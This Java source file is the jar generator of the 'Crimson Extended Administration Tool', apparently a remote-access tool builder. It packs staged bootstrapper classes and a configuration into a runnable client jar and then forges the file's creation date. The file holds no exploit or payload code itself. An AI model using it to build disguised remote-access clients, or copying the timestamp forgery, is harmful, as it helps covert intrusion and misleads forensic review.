package subterranean.crimson.server.generation;

/*
 * 	Crimson Extended Administration Tool
 *  Copyright (C) 2015 Subterranean Security
 *
 *  This program is free software: you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation, either version 3 of the License, or
 *  (at your option) any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program.  If not, see <http://www.gnu.org/licenses/>.
 * 
 */

import java.io.File;
import java.io.FileNotFoundException;
import java.io.IOException;
import java.io.PrintWriter;
import java.nio.file.InvalidPathException;
import java.util.ArrayList;
import java.util.Date;

import subterranean.crimson.server.graphics.BackgroundProgressLights;
import subterranean.crimson.universal.FileAttributeManipulator;
import subterranean.crimson.universal.GenerationUtils;
import subterranean.crimson.universal.Logger;
import subterranean.crimson.universal.Path;
import subterranean.crimson.universal.Reporter;
import subterranean.crimson.universal.Utilities;
import subterranean.crimson.universal.classreference.Bootstrapper;
import subterranean.crimson.universal.classreference.ClassReference;
import subterranean.crimson.universal.classreference.Stage1;
import subterranean.crimson.universal.containers.Options;
import subterranean.crimson.universal.objects.ObjectTransfer;

public class JAR extends Generator {

	private Options options;
	private long creation;
	private ArrayList<String> skip;

	public JAR(Options opts, Path pa, long c) {

		options = opts;
		outPath = pa;
		creation = c;

		report = new ArrayList<String[]>();
		report.add(new String[] { "Generated:", "Runnable Jar File" });
		report.add(new String[] { "Output Location:", outPath.getAbsolutePath() });
	}

	public void run() {

		BackgroundProgressLights.start("Generation in Progress");
		Date d1 = new Date();
		// now create jar from temp files
		Boolean suc = true;
		String ERROR = "UNKNOWN";
		File root = Utilities.getTemp();
		try {// to make sure statuslight turn off
			skip = new ArrayList<String>();

			// copy jar filesystem to temp location
			// create dirs

			GenerationUtils.writeClasses(Bootstrapper.resources, root, skip);

			GenerationUtils.writeClasses(Stage1.resources, root, skip);

			// copy options
			Logger.add("Copying options file to filesystem");
			File opt = new File(root.getAbsolutePath() + "/subterranean/crimson/options");
			try {
				PrintWriter pw = new PrintWriter(opt);
				pw.println(ObjectTransfer.toString(options, true));

				pw.close();
			} catch (FileNotFoundException e1) {
				// TODO Auto-generated catch block
				e1.printStackTrace();
				suc = false;
				ERROR = "Failed to copy options to filesystem";
				return;
			}

			Logger.add("Writing Jar file");
			try {
				String[] targets = { "io", "subterranean" };
				suc = GenerationUtils.create(outPath.getAbsolutePath(), targets, "subterranean.crimson.bootstrapper.Client", root);
			} catch (IOException e) {
				// TODO Auto-generated catch block
				Reporter.report(e);
				suc = false;
				ERROR = "Failed to write jar file";
				return;
			}

			try {
				Thread.sleep(500);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
				suc = false;
				ERROR = "Thread was interrupted";
				return;
			}

			System.gc();

			try {
				Thread.sleep(500);
			} catch (InterruptedException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}

			// set creation date
			try {
				FileAttributeManipulator.setCreationDate(outPath.getAbsolutePath(), new Date(creation));
			} catch (InvalidPathException e) {
				suc = false;
				ERROR = "Failed to set creation date";

				return;
			}

		} finally {

			// delete temp files
			// Utilities.delete(root);

			Date d2 = new Date();
			// compare the dates
			double time = (d2.getTime() - d1.getTime()) / 1000.0;

			report.add(new String[] { "Generation Time:", time + " seconds" });

			if (suc) {
				success();
			} else {
				failure(ERROR);
				// Utilities.delete(new File(outPath.getAbsolutePath()));

			}

			BackgroundProgressLights.stop("Generation in Progress");
		}

	}

}
